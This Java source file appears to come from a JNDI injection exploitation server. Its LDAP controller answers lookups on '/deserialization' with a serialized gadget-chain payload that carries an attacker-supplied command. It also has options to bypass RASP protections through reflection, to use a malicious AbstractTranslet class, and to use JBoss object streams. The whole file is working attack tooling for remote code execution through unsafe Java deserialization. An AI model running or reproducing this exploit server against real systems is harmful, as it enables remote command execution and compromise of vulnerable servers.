package com.nu1r.jndi.controllers;

import com.nu1r.jndi.enumtypes.GadgetType;
import com.nu1r.jndi.enumtypes.PayloadType;
import com.nu1r.jndi.exceptions.IncorrectParamsException;
import com.nu1r.jndi.exceptions.UnSupportedGadgetTypeException;
import com.nu1r.jndi.exceptions.UnSupportedPayloadTypeException;
import com.nu1r.jndi.gadgets.ObjectPayload;
import com.nu1r.jndi.gadgets.utils.Serializer;
import com.nu1r.jndi.gadgets.utils.Util;
import com.nu1r.jndi.gadgets.utils.dirty.DirtyDataWrapper;
import com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;
import com.unboundid.ldap.sdk.Entry;
import com.unboundid.ldap.sdk.LDAPResult;
import com.unboundid.ldap.sdk.ResultCode;
import org.apache.commons.cli.CommandLine;
import org.apache.commons.cli.CommandLineParser;
import org.apache.commons.cli.DefaultParser;
import org.apache.commons.cli.Options;

import java.io.ByteArrayOutputStream;

import static com.nu1r.jndi.gadgets.Config.Config.*;
import static org.fusesource.jansi.Ansi.ansi;

@LdapMapping(uri = {"/deserialization"})
public class SerializedDataController implements LdapController {
    private              String  gadgetType;
    private              PayloadType payloadType;
    private              String[]    params;
    public static        CommandLine cmdLine;
    private static final int         USAGE_CODE = 64;

    @Override
    public void sendResult(InMemoryInterceptedSearchResult result, String base) throws Exception {
        System.out.println(ansi().render("@|green [+]|@Send LDAP result for" + base + " with javaSerializedData attribute"));
        Entry e = new Entry(base);

        try {
            final Class<? extends ObjectPayload> payloadClass = ObjectPayload.Utils.getPayloadClass(String.valueOf(gadgetType));
            ObjectPayload                        payload      = payloadClass.newInstance();
            Object                               object       = payload.getObject(payloadType, params);

            ByteArrayOutputStream out   = new ByteArrayOutputStream();
            byte[]                bytes = Serializer.serialize(object, out);

            e.addAttribute("javaClassName", "foo");
            e.addAttribute("javaSerializedData", bytes);
            result.sendSearchEntry(e);
            result.setResult(new LDAPResult(0, ResultCode.SUCCESS));
        } catch (Throwable er) {
            System.err.println("Error while generating or serializing payload");
            er.printStackTrace();
        }
    }

    @Override
    public void process(String base) throws UnSupportedPayloadTypeException, IncorrectParamsException, UnSupportedGadgetTypeException {
        try {
            int firstIndex  = base.indexOf("/");
            int secondIndex = base.indexOf("/", firstIndex + 1);
            try {
                gadgetType = base.substring(firstIndex + 1, secondIndex);
                System.out.println("[+] GaddgetType >> " + gadgetType);
            } catch (IllegalArgumentException e) {
                throw new UnSupportedGadgetTypeException("UnSupportGaddgetType >> " + base.substring(firstIndex + 1, secondIndex));
            }

            int thirdIndex = base.indexOf("/", secondIndex + 1);
            if (thirdIndex < 0) thirdIndex = base.length();
            try {
                payloadType = PayloadType.valueOf(base.substring(secondIndex + 1, thirdIndex));
                //System.out.println("[+] PayloadType >> " + payloadType);
            } catch (IllegalArgumentException e) {
                throw new UnSupportedPayloadTypeException("UnSupportedPayloadType: " + base.substring(secondIndex + 1, thirdIndex));
            }

            if (payloadType == PayloadType.nu1r) {
                String arg = Util.getCmdFromBase(base);
                if (arg.contains(" ")) {
                    String[] args    = arg.split(" ");
                    Options  options = new Options();
                    options.addOption("a", "AbstractTranslet", false, "恶意类是否继承 AbstractTranslet");
                    options.addOption("o", "obscure", false, "使用反射绕过");
                    options.addOption("j", "jboss", false, "Using JBoss ObjectInputStream/ObjectOutputStream");
                    CommandLineParser parser = new DefaultParser();

                    try {
                        cmdLine = parser.parse(options, args);
                    } catch (Exception e) {
                        System.out.println("[*] Parameter input error, please use -h for more information");
                    }

                    params = new String[]{args[0]};
                    System.out.println("[+] command：" + args[0]);

                    if (cmdLine.hasOption("obscure")) {
                        IS_OBSCURE = true;
                        System.out.println(ansi().render("@|green [+]|@ 使用反射绕过RASP "));
                    }

                    if (cmdLine.hasOption("AbstractTranslet")) {
                        IS_INHERIT_ABSTRACT_TRANSLET = true;
                        System.out.println("[+] 继承恶意类AbstractTranslet");
                    }

                    if (cmdLine.hasOption("jboss")) {
                        IS_JBOSS_OBJECT_INPUT_STREAM = true;
                    }
                } else {
                    params = new String[]{arg};
                    System.out.println("[+] command：" + arg);
                }

            }

        } catch (Exception e) {
            if (e instanceof UnSupportedPayloadTypeException) throw (UnSupportedPayloadTypeException) e;
            if (e instanceof UnSupportedGadgetTypeException) throw (UnSupportedGadgetTypeException) e;

            throw new IncorrectParamsException("Incorrect params >> " + base);
        }
    }
}
